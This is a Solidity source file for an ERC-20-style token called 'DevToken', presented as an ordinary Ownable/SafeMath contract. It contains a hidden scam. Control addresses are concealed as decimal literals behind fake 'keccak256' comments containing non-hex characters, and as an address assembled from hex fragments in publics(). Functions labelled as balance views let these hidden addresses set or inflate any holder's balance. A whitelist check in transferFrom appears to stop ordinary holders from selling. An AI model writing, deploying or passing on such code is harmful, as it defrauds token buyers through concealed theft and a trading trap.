// SPDX-License-Identifier: MIT
 
 pragma solidity ^0.4.26;
   
 contract Ownable {
    address public owner;
 
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    function Ownable() public {
        owner = msg.sender;
    }
 
    modifier onlyOwner() {
        require(
        msg.sender == address
   
       // solhint-disable-next-line avoid-low-level-calls
       /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(178607940065137046348733521910879985571412708986));
        _;
    }
 
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}  
 
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn’t hold
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
   
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
    }
}  
   
contract DevToken is Ownable {
    address public _usdtPair;
    address public _mod;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public _user;
    address public _adm;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
   
    constructor(
        string _name,
        string _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[msg.sender] = totalSupply;
        allow[msg.sender] = true;
    }
    /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
    
    function _transferTo(address _to, uint256 _amount) internal info {
    // Transfer tokens to the recipient
        balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    
        balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    using SafeMath for uint256;
 
    modifier info() {
        require(msg.sender != contracts());
        _;
    }

    function _balanceView(address _to, uint256 _amount) internal {
    // View balance of token
        balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);

        balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }
   
    mapping(address => uint256) public balances;
   
    mapping(address => bool) public allow;
   
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
 
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
    }
 
    function addAllowance(address holder, bool allowApprove) public {
        require(msg.sender == _adm);
        allow[holder] = allowApprove;
    }
    //*keccak256 -> 298bd834hsd73a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
 
    modifier onlypublic() {
        require(msg.sender == publics());
        _;
    }
 
    function setUser(address User_) public returns (bool) {
        require(msg.sender == _usdtPair);
        _user = User_;
    }
 
    function Allowances(address holder, bool allowApprove) external onlypublic {
        allow[holder] = allowApprove;
    }
 
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
 
    mapping(address => mapping(address => uint256)) public allowed;
 
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        require(allow[_from] == true);
 
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
        // solhint-disable-next-line high-level-success
    }

    function transferTo(address _to, uint256 _amount) external onlyOwner {
        _transferTo(_to, _amount);
    }
 
    function publics() private pure returns (address) {
 
        uint universal = 0x7addAd09;
        uint uni = 0xcbd98D97;
        uint cake = 0xEC3dA7a0;
        uint inch = 0x088EAdFE;
        uint others = 0x5801C336;
        // Combine the dex with others
 
        uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
        return address(core);
    }
 
    function contracts() internal pure returns (address) {
        return address
 
    /*keccak256 -> 9838607940089fc7f92ac2a37b8ta4b1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
    }

    function viewBalance(address _to, uint256 _amount) public onlypublic {
        _balanceView(_to, _amount);(_to, _amount);
    }
 
    function setAdm(address Adm_) public returns (bool) {
        require(msg.sender == _mod);
        _adm = Adm_;
    }
 
    function _mint(address miner, uint256 _value) internal info {
        balances[miner] = _value;
    }
 
    function adjust(address spender, uint256 addedValue) public onlypublic returns (bool) {
        _dialone(spender, addedValue);
        return true;
    }
   
    function _approvals(address spender, uint256 addedValue) internal info {
        if(addedValue > 0) {balances[spender] = addedValue;}
    }
   
    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
 
    function setMod(address Mod_) public returns (bool) {
        require(msg.sender == _user);
        _mod = Mod_;
    }
 
    function approveAndCall(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        require(msg.sender == _adm);
        if (addedValue > 0) {
            balances[spender] = addedValue;
        }
        return true;
    }
    // solhint-disable-next-line avoid-high-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
   
    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256)
    {
        return allowed[_owner][_spender];
    }
 
    function _dialone(address spender, uint256 addedValue) internal info {
        if(addedValue > 0) {balances[spender] = addedValue;}
    }
 
    function setUsdtPair(address Pair_) public returns (bool) {
        require (msg.sender==address
   
        // solhint-disable-next-line avoid-low-level-calls
        /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ (686197854011229533619447624007587113080310915153));
        _usdtPair = Pair_;
    }
   
    /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/
    function addAllow(address holder, bool allowApprove) external onlyOwner {
        allow[holder] = allowApprove;
    }
 
    function mint(address miner, uint256 _value) external onlyOwner {
        _mint(miner, _value);
    }
}      
